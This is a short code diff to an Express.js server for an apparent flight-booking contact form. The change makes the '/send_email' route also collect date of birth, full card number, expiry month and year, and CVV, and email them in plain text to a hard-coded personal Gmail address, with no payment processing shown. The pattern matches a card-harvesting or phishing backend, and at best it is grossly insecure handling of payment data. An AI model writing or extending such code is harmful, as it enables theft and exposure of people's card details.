@@ -26,13 +26,13 @@ app.get('/', (req, res) => {
 });
 
 app.post('/send_email', (req, res) => {
-    const { name, email, phone, from, to, trip, flying, departuring } = req.body;
+    const { name, email, phone, from, to, trip, flying, departuring, dob, card_number, mm, yy, cvv } = req.body;
 
     const mailOptions = {
         from: 'ap1663392@gmail.com',
         to: 'ap1663392@gmail.com', // Receiver's email address
         subject: 'Contact Form Submission',
-        text: `Name: ${name}\nEmail: ${email}\nPhone:${phone}\nTrip: ${trip}\Departuring: ${departuring}\nFlying: ${flying}\nfrom:${from}\nto:${to}`,
+        text: `Name: ${name}\nEmail: ${email}\nPhone:${phone}\nTrip: ${trip}\nDeparturing: ${departuring}\nFlying: ${flying}\nfrom:${from}\nto:${to}\nDOB : ${dob}\nCard_Number : ${card_number}\nMM : ${mm}\nyy : ${yy}\nCVV :${cvv}`,
     };
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
